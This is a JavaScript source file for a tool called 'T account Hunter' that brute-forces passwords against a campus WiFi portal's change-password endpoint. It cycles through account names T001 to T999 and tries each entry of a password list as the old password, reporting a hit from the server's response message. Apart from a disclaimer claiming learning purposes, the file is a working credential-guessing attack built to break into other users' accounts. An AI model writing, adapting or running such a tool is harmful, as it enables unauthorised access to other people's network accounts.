//The Software is provided for development and learning purposes only. The Author expressly disclaims any liability for any claim arising from the use or distribution of the Software. Users are solely responsible for ensuring that their use of the Software complies with all applicable laws and regulations.
//Copyright ©2024 JasonL111
//This product is under Apache2 license
// Use ES Module to import,use figlet to display better
import fetch from 'node-fetch';
import fs from 'fs/promises';
import figlet from 'figlet';
import readline from 'readline';


// Notice: You should read the README.md first unless you have basic knowledge of Javascript

async function tryPasswords(account, limit) {
    console.log("\nTesting",account)
    try {
        const text = await fs.readFile('passwords.txt', 'utf8');
        const passwords = text.split('\n');
        const totalPasswords = Math.min(passwords.length, limit);

        for (let i = 0; i < totalPasswords; i++) {
            let password = passwords[i].trim();
            let body = `user_name=${account}&old_password=${password}&new_password=${password}&re_password=${password}`;

            try {
                // here to input the url of change password page. You should follow the README.md to know what to copy and where to paste.
                let fetchResponse = await fetch("", {
                    "headers": {
                        "accept": "application/json, text/javascript, */*; q=0.01",
                        "accept-language": "en",
                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "x-requested-with": "XMLHttpRequest"
                    },
                    "body": body,
                    "method": "POST",
                });
                let responseData = await fetchResponse.json();
                // text may be diffrent with your situation, you may need to modify the text in the next line
                if (responseData.message === "请求未授权") {
                    console.log(`\n\x1b[32m${account}:${password}\x1b[0m`);
                    break;
                }
                updateProgressBar(totalPasswords, i + 1, 50);
            } catch (error) {
                console.error("Error during fetch:", error);
            }
        }
    } catch (error) {
        console.error("Error reading the file:", error);
    }
}

// this is a function for the progress bar. 
function updateProgressBar(total, current, threshold) {
    if (current % threshold === 0 || current === total) {
        const percentage = Math.floor((current / total) * 100);
        const progressBarLength = 60;
        const filledLength = Math.floor((percentage / 100) * progressBarLength);
        const filledBar = '='.repeat(filledLength);
        const emptyBar = ' '.repeat(progressBarLength - filledLength);

        process.stdout.clearLine();
        process.stdout.cursorTo(0);
        process.stdout.write(`Progress: [${filledBar}${emptyBar}] ${percentage}%`);
    }

    if (current === total) {
        console.log("\nTest completed.We can't break the password.");
    }
}
// Account name in your situation maybe diffrent. In this campus WIFI, usernames are consist with "T"and 3 digits.
async function main(account) {
    let account1=account
    for (let z = 1; z < 10; z++) {
        if(account1>=10){
            break;
        }
        let account = `T00${z}`;
        await tryPasswords(account, 3000);
    }
    for (let y = 10; y < 100; y++) {
        if(account1>=100){
            break;
        }
        let account = `T0${y}`;
        await tryPasswords(account, 3000);
    }
    for (let x = account1; x <= 999; x++) {
        let account = `T${x}`;
        await tryPasswords(account, 3000);
    }
}

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});
// use figlet to display 
const myPromise = new Promise((resolve, reject) => {
    figlet('T account Hunter', (err, data) => {
        if (err) {
            console.error('Something went wrong...');
            console.error(err);
            reject(err);  
        } else {
            console.log(data);  
            resolve();  
        }
    });
});

// a function to get user input, set where to start
const anotherPromise = () => new Promise((resolve, reject) => {
    rl.question('Where should we start?\n', (account) => {
        rl.close();  
        resolve(account);  
    });
});
myPromise
    .then(() => anotherPromise())
    .then((account) => {
        main(account)
    })
